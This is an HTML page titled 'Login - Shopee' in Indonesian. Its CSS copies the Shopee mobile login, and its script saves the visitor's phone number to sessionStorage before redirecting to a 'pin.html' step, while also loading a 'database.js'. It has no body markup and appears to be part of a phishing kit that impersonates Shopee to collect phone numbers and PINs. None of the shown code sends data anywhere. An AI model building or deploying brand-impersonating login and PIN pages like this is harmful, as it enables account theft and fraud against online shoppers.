
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="theme-color" content="#FF6B35">
    <title>Login - Shopee</title>
    <style>
        .status-bar {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 5px;
            background-color: #FF6B35;
            z-index: 1000;
        }

        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background: #f5f5f5;
            min-height: 100vh;
        }

        .login-header {
            background: white;
            padding: 15px 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }

        .login-header-left {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .login-back-btn {
            background: none;
            border: none;
            color: #FF6B35;
            font-size: 24px;
            cursor: pointer;
            padding: 5px;
        }

        .login-title {
            font-size: 18px;
            color: #333;
            font-weight: 500;
        }

        .help-icon {
            background: none;
            border: none;
            color: #FF6B35;
            font-size: 20px;
            cursor: pointer;
            width: 30px;
            height: 30px;
            border-radius: 50%;
            border: 2px solid #FF6B35;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .login-content {
            padding: 30px 20px;
            max-width: 500px;
            margin: 0 auto;
        }

        .login-logo {
            width: 80px;
            height: 80px;
            margin: 0 auto 30px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .login-logo svg {
            width: 100%;
            height: 100%;
        }

        .input-group {
            margin-bottom: 20px;
        }

        .input-wrapper {
            position: relative;
            display: flex;
            align-items: center;
            background: white;
            border-radius: 8px;
            padding: 15px;
            border: 1px solid #e0e0e0;
        }

        .input-icon {
            width: 24px;
            height: 24px;
            margin-right: 10px;
            color: #999;
        }

        .login-input {
            border: none;
            outline: none;
            font-size: 15px;
            width: 100%;
            color: #333;
        }

        .login-input::placeholder {
            color: #ccc;
        }

        .next-btn {
            background: #e0e0e0;
            color: #999;
            border: none;
            padding: 15px;
            border-radius: 8px;
            width: 100%;
            font-size: 16px;
            font-weight: 500;
            cursor: not-allowed;
            margin-bottom: 15px;
        }

        .next-btn.active {
            background: #FF6B35;
            color: white;
            cursor: pointer;
        }

        .login-links {
            display: flex;
            justify-content: space-between;
            margin-bottom: 30px;
        }

        .login-link {
            color: #1E90FF;
            text-decoration: none;
            font-size: 14px;
        }

        .divider {
            text-align: center;
            margin: 30px 0;
            color: #999;
            font-size: 14px;
            position: relative;
        }

        .divider::before,
        .divider::after {
            content: '';
            position: absolute;
            top: 50%;
            width: 40%;
            height: 1px;
            background: #e0e0e0;
        }

        .divider::before {
            left: 0;
        }

        .divider::after {
            right: 0;
        }

        .social-login {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .social-btn {
            background: white;
            border: 1px solid #e0e0e0;
            padding: 15px;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            font-size: 15px;
            color: #333;
            cursor: pointer;
            transition: background 0.2s;
        }

        .social-btn:hover {
            background: #f9f9f9;
        }

        .social-icon {
            width: 24px;
            height: 24px;
        }
    </style>
</head>

    <script src="config.js"></script>
    <script src="database.js"></script>
    <script>
        function checkInput() {
            const phoneInput = document.getElementById('phoneInput');
            const btn = document.getElementById('nextBtn');

            if (phoneInput.value.length > 9) {
                btn.classList.add('active');
                btn.disabled = false;
            } else {
                btn.classList.remove('active');
                btn.disabled = true;
            }
        }

        function goToPin() {
            const phoneNumber = document.getElementById('phoneInput').value;
            
            // Save to sessionStorage
            sessionStorage.setItem('userPhone', phoneNumber);
            
            // Redirect to pin page
            window.location.href = 'pin.html';
        }
    </script>
